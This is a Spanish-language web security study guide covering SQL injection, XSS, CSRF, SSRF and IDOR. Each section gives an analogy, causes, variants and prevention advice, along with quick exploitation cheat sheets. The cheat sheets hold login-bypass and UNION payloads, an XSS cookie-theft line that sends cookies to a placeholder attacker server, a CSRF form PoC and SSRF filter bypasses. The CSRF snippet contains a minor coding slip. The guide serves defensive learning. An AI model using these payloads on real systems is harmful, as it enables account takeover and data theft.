# 📚 Apuntes de Seguridad Web: Guía Práctica de Referencia desde Cero

Esta guía está diseñada para entender desde los cimientos las 5 vulnerabilidades web más importantes. Cada sección incluye la explicación conceptual con analogías, la causa técnica, las variantes, una **hoja de trucos (cheat sheet) de explotación rápida** y la forma de prevenirlas.

---

## 1. SQL Injection (SQLi) – Inyección SQL

### ¿Qué es? (Analogía)
Imagina que vas al banco y en la ventanilla entregas una planilla donde te piden tu nombre. En lugar de escribir solo *"Juan"*, escribes *"Juan y regálale 1.000€ a quien lea esto"*. Si el cajero lee la orden completa y la ejecuta al pie de la letra sin verificar, has realizado una inyección. 

En la web, ocurre cuando una aplicación toma datos del usuario y los pega directamente dentro de una instrucción SQL hacia la base de datos sin sanearlos. Esto permite alterar la lógica de la consulta e interactuar sin autorización con la base de datos.

### ¿Por qué ocurre?
Por la **concatenación directa de entradas de usuario** en cadenas de texto de consultas SQL.

### Tipos de SQLi
1. **In-Band (En banda):** La respuesta o los datos extraídos se ven directamente en la página web.
   * **Basada en errores:** La base de datos muestra mensajes de error técnicos que filtran su estructura interna o datos.
   * **Basada en UNION:** Usa el operador `UNION` para unir una segunda consulta `SELECT` y extraer datos de otras tablas.
2. **Blind (Ciega):** La página no muestra datos ni errores explícitos; hay que deducir la información por respuestas indirectas.
   * **Bypass de autenticación:** Modifica la consulta para que la condición sea siempre verdadera (ej. `' OR 1=1;--`) y salte la contraseña.
   * **Basada en booleanos:** Se hacen preguntas de Sí/No a la base de datos midiendo cambios sutiles en la respuesta de la página.
   * **Basada en tiempo:** Se inyectan pausas con funciones como `SLEEP(5)` y se mide el tiempo de respuesta del servidor.
3. **Out-of-Band (Fuera de banda - OOB):** Se fuerza al servidor de base de datos a realizar una petición DNS o HTTP hacia un servidor externo controlado por el atacante (usando `LOAD_FILE()` en MySQL o `xp_dirtree` en MSSQL).

### ⚡ Cheat Sheet de Explotación Rápida
* **Detección rápida:** Probar inyectar comillas simples `'`, comillas dobles `"`, o `;--` en campos o parámetros URL.
* **Bypass de Login:** `' OR 1=1;--` o `admin'--`.
* **Pasos para UNION SQLi:**
  1. Descubrir número de columnas: `UNION SELECT 1,2,3--` (incrementar hasta que no dé error).
  2. Determinar columna visible: `0 UNION SELECT 1,2,3--` (usar un ID inexistente como `0` para ver cuáles números aparecen en pantalla).
  3. Obtener nombre de base de datos: `0 UNION SELECT 1,database(),3--`.
  4. Enumerar tablas y columnas: Consultar la base de datos metadato `information_schema.tables` e `information_schema.columns`.

### 🛡️ Prevención
* **Consultas Preparadas (Sentencias Parametrizadas):** Separan físicamente el código SQL de los datos introducidos por el usuario.
* Validación de entrada (Listas de permitidos) y Principio de Mínimo Privilegio en la base de datos.

---

## 2. Cross-Site Scripting (XSS) – Script en Sitios Cruzados

### ¿Qué es? (Analogía)
Es como dejar un cartel escrito en un tablón de anuncios público. Sin embargo, en lugar de texto normal, utilizas una "tinta mágica" (código JavaScript). Cuando cualquier otra persona pasa a leer el tablón, la tinta mágica se activa en sus ojos y le obliga a entregarte las llaves de su casa sin que se dé cuenta.

En la web, el XSS ocurre cuando una aplicación recibe datos del usuario y los muestra en la página sin filtrarlos, permitiendo la ejecución de JavaScript en el navegador de la víctima.

### ¿Por qué ocurre?
El navegador interpreta los datos introducidos por el usuario como código ejecutable HTML/JavaScript en lugar de tratarlo como texto plano.

### Tipos de XSS
1. **Reflejado (Reflected / No persistente):** El código malicioso viene en la solicitud (ej. parámetro de búsqueda en una URL). El servidor lo "refleja" inmediatamente en la respuesta. Requiere que la víctima haga clic en un enlace preparado.
2. **Almacenado (Stored / Persistente):** El código malicioso se guarda permanentemente en la base de datos (ej. un comentario o biografía). Se ejecuta en el navegador de **todos** los usuarios que visiten esa sección.
3. **Basado en DOM (DOM-Based):** Ocurre enteramente en el cliente. El JavaScript legítimo de la página lee datos vulnerables del navegador (como `location.hash` o la URL) y los escribe de forma insegura con funciones como `innerHTML`.
4. **Ciego (Blind XSS):** El payload se almacena pero se ejecuta en un área privada a la que el atacante no tiene acceso visual (ej. un panel interno de tickets de soporte visto solo por administradores).

### ⚡ Cheat Sheet de Explotación Rápida
* **Prueba básica (PoC):** `<script>alert('XSS')</script>`.
* **Escapar de un atributo HTML (`<input value="...">`):** `"> <script>alert('THM')</script>`.
* **Escapar de un bloque `<textarea>`:** `</textarea><script>alert('THM')</script>`.
* **Inyección dentro de JavaScript existente:** `';alert('THM');//`.
* **Evitar filtros de etiquetas `<script>`:** Usar eventos HTML como `<img src="x" onerror="alert(1)">` o `/imagen.jpg" onload="alert('THM');`.
* **Robo de Cookies de sesión:** `fetch('http://SERVIDO-ATACANTE/?cookie=' + btoa(document.cookie))`.

### 🛡️ Prevención
* **Escapado/Codificación de Salida (Output Encoding):** Convertir caracteres especiales como `<` a `&lt;` para que el navegador los interprete como texto y no como código.
* **Atributo `HttpOnly` en cookies:** Impide que el código JavaScript pueda leer la cookie de sesión.

---

## 3. Cross-Site Request Forgery (CSRF) – Falsificación de Solicitudes

### ¿Qué es? (Analogía)
Estás dentro de un banco autenticado y con la sesión abierta. De repente, alguien en la calle te pasa un folleto publicitario. Al abrir el folleto, sin darte cuenta, le entregas una orden firmada por ti al cajero del banco para que cambie tu dirección postal o transfiera dinero a la cuenta del atacante.

CSRF engaña al navegador de un usuario autenticado para que envíe una solicitud no deseada a una aplicación web donde la víctima ya ha iniciado sesión.

### ¿Por qué ocurre?
Los navegadores adjuntan automáticamente las **cookies de sesión** en cada solicitud enviada al sitio de destino, sin importar desde qué página web externa se haya originado la petición. La aplicación web procesa la solicitud asumiendo que fue realizada intencionalmente por el usuario.

### Condicionales para un Ataque CSRF
1. La víctima debe estar **autenticada** en el sitio de destino.
2. La acción debe **cambiar un estado** (ej. cambiar contraseña, correo electrónico o realizar pagos).
3. La aplicación carece de mecanismos para verificar el origen real de la solicitud.

### ⚡ Cheat Sheet de Explotación Rápida
* **PoC con Formulario HTML Oculto:**
```html
<form action="http://sitio-vulnerable.com/settings" method="POST">
  <input type="hidden" name="email" value="attacker@evil.com" />
</form>
<script>document.forms.submit();</script>
```
* Funciona tanto con solicitudes **GET** como **POST**.

### 🛡️ Prevención
* **Tokens anti-CSRF:** Claves aleatorias e impredecibles asociadas a la sesión del usuario que se incluyen en cada formulario y se validan en el servidor.
* Configuración de cookies con el atributo **`SameSite=Strict`** o **`SameSite=Lax`**.

---

## 4. Server-Side Request Forgery (SSRF) – Falsificación de Solicitudes en el Servidor

### ¿Qué es? (Analogía)
Le pides al mensajero de una empresa que vaya a la oficina interna del director (a la que tú no tienes acceso) y te traiga los documentos que están sobre su escritorio. Como el mensajero es un empleado interno de confianza, los guardias de seguridad lo dejan pasar sin hacer preguntas.

En SSRF, el atacante manipula un parámetro en la aplicación web para forzar al **servidor backend** a realizar peticiones HTTP hacia destinos elegidos por el atacante (servidores internos, servicios locales o APIs en la nube).

### ¿Por qué ocurre?
Los sistemas y redes internas confían ciegamente en las peticiones que se originan dentro de su propia IP de servidor de aplicaciones, omitiendo autenticaciones adicionales.

### Tipos e Impacto
* **SSRF Regular (Visible):** La respuesta del recurso interno se muestra directamente en la pantalla del usuario.
* **SSRF Ciego (Blind SSRF):** El servidor realiza la solicitud interna pero no muestra el contenido. Debe confirmarse recibiendo conexiones en un servidor externo (ej. Burp Collaborator) o analizando diferencias de tiempos.
* **Impacto:** Acceso a paneles de administración internos, escaneo de red interna y robo de credenciales de metadatos en la nube en la dirección IP especial `169.254.169.254` (AWS, Azure, GCP).

### ⚡ Cheat Sheet de Bypass de Defensas
* **Bypass de filtros `127.0.0.1` o `localhost`:**
  * Uso de IP abreviada/cero: `http://127.1`, `http://0` o `http://0.0.0.0`.
  * Representación Decimal u Octal: `http://2130706433`.
  * Uso de dominios DNS comodín: `http://127.0.0.1.nip.io`.
  * En IPv6: `http://[::1]`.
* **Uso de Credenciales de URL (@):** `https://sitio-permitido.com@attacker.com/`.
* **Path Traversal en URL:** Uso de `/../admin` para saltar directorios de la API.
* **Open Redirects:** Encadenar una redirección abierta existente en un dominio de confianza hacia la IP interna.

### 🛡️ Prevención
* Implementar **listas de permitidos (Allow lists)** estrictas para dominios y esquemas de URL permitidos.
* Validar y analizar (parsear) adecuadamente las cadenas URL antes de realizar solicitudes.
* Deshabilitar el seguimiento de redirecciones HTTP salientes.

---

## 5. Insecure Direct Object Reference (IDOR) – Referencias Directas Inseguras a Objetos

### ¿Qué es? (Analogía)
Llegas a un hotel, te entregan la llave de la habitación número 105. Te das cuenta de que si caminas hacia la habitación 106 e intentas introducir tu llave o cambiar el número en el pomo, la puerta se abre de par en par y puedes ver el equipaje de otro huésped.

IDOR es una falla de control de acceso que ocurre cuando una aplicación utiliza un identificador directo (como un número en la URL o parámetro) para recuperar un recurso sin verificar si el usuario autenticado tiene permisos para acceder a ese objeto específico.

### ¿Por qué ocurre?
El servidor valida la **autenticación** (sabe quién eres porque iniciaste sesión), pero carece por completo de la capa de **autorización** (no verifica si la sesión actual es la dueña del registro solicitado).

### Tipos de Identificadores
1. **Secuenciales/Texto Plano:** `https://sitio.com/profile?user_id=1305` → cambiar a `user_id=1000`.
2. **Codificados (ej. Base64):** Identificadores como `eyJ1c2VyX2lkIjogNX0=`. Decodificar → Modificar ID → Recodificar → Enviar.
3. **Hasheados (ej. MD5/SHA-1):** Si se usa un hash de un entero predecible (ej. MD5 de `100`), calcular el hash del ID objetivo e inyectarlo.
4. **UUIDs / Impredecibles:** Probar la **técnica de dos cuentas**: obtener el UUID del recurso con la Cuenta A e intentar acceder a él estando autenticado con la Cuenta B.

### ⚡ Ubicaciones Comunes para Probar IDOR
* Parámetros en la URL y segmentos de ruta de API REST (`/api/users/123/orders`).
* Parámetros en solicitudes POST y JSON.
* Encabezados HTTP, Cookies y solicitudes AJAX en segundo plano.
* **Minería de parámetros:** Probar agregar parámetros no expuestos en la interfaz como `?user_id=123` a llamadas API que normalmente no piden ID.

### 🛡️ Prevención
* Realizar verificaciones explícitas de **autorización a nivel de objeto** en el servidor para cada solicitud.
* Usar controles de acceso basados en roles (RBAC).
